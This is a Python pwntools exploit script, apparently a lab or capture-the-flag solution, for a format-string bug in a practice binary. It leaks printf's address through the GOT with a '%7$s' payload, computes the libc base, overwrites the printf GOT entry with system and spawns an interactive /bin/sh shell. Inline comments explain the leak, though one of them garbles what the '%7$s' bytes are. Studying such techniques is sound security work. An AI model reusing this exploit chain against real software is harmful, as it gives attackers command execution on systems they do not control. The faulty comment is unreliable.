from pwn import *

elf = context.binary = ELF('./got_overwrite-64')
libc = elf.libc

p = process()

# ASLR bypass
payload = b'%7$s'		# 4 byte address (only the lower 4 bytes of the GOT address are used by printf)
payload += b'||||'		# 4 bytes (junk) needed to align with System V ABI
payload += p64(elf.got['printf'])


# What Happens in Runtime
# The Vulnerable printf(buffer) Call:

# The printf function interprets your input as a format string.
# When it encounters %7$s, it looks for the 7th argument on the stack.


# The GOT Address:

# The p64(elf.got['printf']) you appended becomes the 7th argument on the stack.
# printf uses this address as a pointer and attempts to print the string at that location.
# The Output:

# The GOT entry for printf contains the runtime address of printf in memory (set by the dynamic linker at runtime).
# Since printf is dynamically linked, its address will vary every time the program runs (due to ASLR).
# The program prints this runtime address, effectively leaking the address of printf.


p.sendline(payload)

printf_leak = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leaked: {hex(printf_leak)}')

libc.address = printf_leak - libc.sym['printf']
log.success(f'Libc Base address: {hex(libc.address)}')

p.clean()

# GOT Overwrite
payload = fmtstr_payload(6, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.sendline('/bin/sh')

p.clean()

p.interactive()